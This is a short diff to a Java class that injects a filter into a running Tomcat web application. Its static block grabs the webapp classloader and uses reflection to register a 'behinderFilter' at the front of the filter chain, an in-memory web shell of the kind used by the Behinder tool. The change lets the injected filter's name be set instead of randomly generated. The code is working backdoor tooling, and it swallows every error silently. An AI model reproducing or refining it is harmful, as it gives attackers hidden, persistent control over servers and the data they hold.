@@ -20,10 +20,10 @@ public class TFMSFromThread implements Filter {
 
 	public static String pattern;
 
+	public static String NAME;
+
 	static {
 		try {
-			final String name = String.valueOf(System.nanoTime());
-
 			WebappClassLoaderBase webappClassLoaderBase =
 					(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
 
@@ -57,14 +57,14 @@ public class TFMSFromThread implements Filter {
 
 			FilterDef filterDef = new FilterDef();
 			filterDef.setFilter(behinderFilter);
-			filterDef.setFilterName(name);
+			filterDef.setFilterName(NAME);
 			filterDef.setFilterClass(behinderFilter.getClass().getName());
 
 			standardContext.addFilterDef(filterDef);
 
 			FilterMap filterMap = new FilterMap();
 			filterMap.addURLPattern(pattern);
-			filterMap.setFilterName(name);
+			filterMap.setFilterName(NAME);
 			filterMap.setDispatcher(DispatcherType.REQUEST.name());
 
 			standardContext.addFilterMapBefore(filterMap);
@@ -73,7 +73,7 @@ public class TFMSFromThread implements Filter {
 			constructor.setAccessible(true);
 			ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
 
-			filterConfigs.put(name, filterConfig);
+			filterConfigs.put(NAME, filterConfig);
 		} catch (Exception ignored) {
 		}
 	}
